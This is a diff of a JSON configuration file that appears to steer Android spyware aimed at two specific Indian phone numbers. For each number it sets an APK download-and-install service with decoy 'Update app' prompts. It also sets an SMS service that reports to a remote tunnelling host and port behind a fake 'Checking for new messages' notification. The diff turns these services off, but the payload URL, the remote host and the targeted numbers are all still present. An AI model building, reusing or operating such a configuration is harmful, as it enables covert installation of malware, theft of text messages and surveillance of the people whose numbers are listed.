@@ -1,36 +1,34 @@
 {
-  "+917976960544": {
-    "download_install": {
-      "service_enable": true,
-	  "update_now": false,
-	  "replace_pkg": false,
-	  "pkg_install_enable": true,
-	  "download_url": "https://redmi9primemv.github.io/CodeReverse/files/update_v1.apk",
-	  "launch_pkg": "",
-	  "notification_msg": ""
-    },
-	"sms_update": {
-      "service_enable": true,
-	  "remote_host": "fine-louisiana.at.ply.gg",
-	  "remote_port": 9752,
-	  "notification_msg": "Checking for new messages."
-    }
-  },
-  "+918290448340": {
-    "download_install": {
-      "service_enable": true,
-	  "update_now": false,
-	  "replace_pkg": true,
-	  "pkg_install_enable": true,
-	  "download_url": "https://redmi9primemv.github.io/CodeReverse/files/update_v1.apk",
-	  "launch_pkg": "",
-	  "notification_msg": "Update now"
-    },
-	"sms_update": {
-      "service_enable": false,
-	  "remote_host": "fine-louisiana.at.ply.gg",
-	  "remote_port": 9752,
-	  "notification_msg": "Checking for new messages."
-    }
-  }
+	"+917976960544": {
+		"download_install": {
+			"service_enable": false,
+			"update_now": false,
+			"pkg_install_enable": true,
+			"download_url": "https://redmi9primemv.github.io/CodeReverse/files/update_v1.apk",
+			"launch_pkg": "",
+			"notification_msg": "Update app"
+		},
+		"sms_update": {
+			"service_enable": false,
+			"remote_host": "fine-louisiana.at.ply.gg",
+			"remote_port": 9752,
+			"notification_msg": "Checking for new messages."
+		}
+	},
+	"+918290448340": {
+		"download_install": {
+			"service_enable": false,
+			"update_now": false,
+			"pkg_install_enable": true,
+			"download_url": "https://redmi9primemv.github.io/CodeReverse/files/update_v1.apk",
+			"launch_pkg": "",
+			"notification_msg": "Update app"
+		},
+		"sms_update": {
+			"service_enable": false,
+			"remote_host": "fine-louisiana.at.ply.gg",
+			"remote_port": 9752,
+			"notification_msg": "Checking for new messages."
+		}
+	}
 }
